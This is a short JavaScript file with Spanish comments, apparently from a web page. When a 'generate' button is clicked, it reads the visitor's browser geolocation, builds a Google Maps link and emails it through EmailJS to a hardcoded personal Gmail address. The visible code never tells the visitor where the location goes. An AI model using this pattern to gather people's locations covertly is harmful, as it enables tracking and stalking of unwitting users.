var latitud;
var longitud;
var enlace;
const destinatario = 'damiangof2@gmail.com';

// Función para obtener la ubicación y enviar el enlace por correo electrónico
function obtenerYEnviarUbicacion() {
    if ("geolocation" in navigator) {
        navigator.geolocation.getCurrentPosition(function (position) {
            latitud = position.coords.latitude;
            longitud = position.coords.longitude;

            console.log("Latitud:", latitud);
            console.log("Longitud:", longitud);

            // Llama a la función para generar el enlace de Google Maps y enviar por correo electrónico
            generarEnlaceYEnviarCorreo();
        }, function (error) {
            mostrarErrorGeolocalizacion(error);
        });
    } else {
        mostrarError("Geolocalization is not available on this browser.");
    }
}

// Función para generar un enlace de Google Maps
function generarEnlaceGoogleMaps(latitud, longitud) {
    enlace = `https://www.google.com/maps?q=${latitud},${longitud}`;
    console.log("Enlace de Google Maps:", enlace);
    return enlace;
}

// Función para enviar el enlace por correo electrónico
function enviarCorreoElectronico(enlace, destinatario) {
    // Objeto con el enlace de Google Maps
    const emailData = {
        destinatario: destinatario,
        enlaceGoogleMaps: enlace,
    };
    const serviceID = 'default_service';
    const templateID = 'template_x3vj23l';

    emailjs.send(serviceID, templateID, emailData)
        .then(function(response) {
            console.log('Correo electrónico enviado con éxito:', response);
        }, function(error) {
            console.error('Error al enviar el correo electrónico:', error);
        });
}

// Función para generar el enlace de Google Maps y enviar el correo electrónico
function generarEnlaceYEnviarCorreo() {
    const enlaceGoogleMaps = generarEnlaceGoogleMaps(latitud, longitud);

    // Envía el enlace por correo electrónico con la dirección del destinatario
    enviarCorreoElectronico(enlaceGoogleMaps, destinatario);
}

// Asigna evento al botón utilizando el modelo de eventos
document.getElementById("generateBtn").addEventListener("click", function(event) {
    event.preventDefault();

    obtenerYEnviarUbicacion();
});
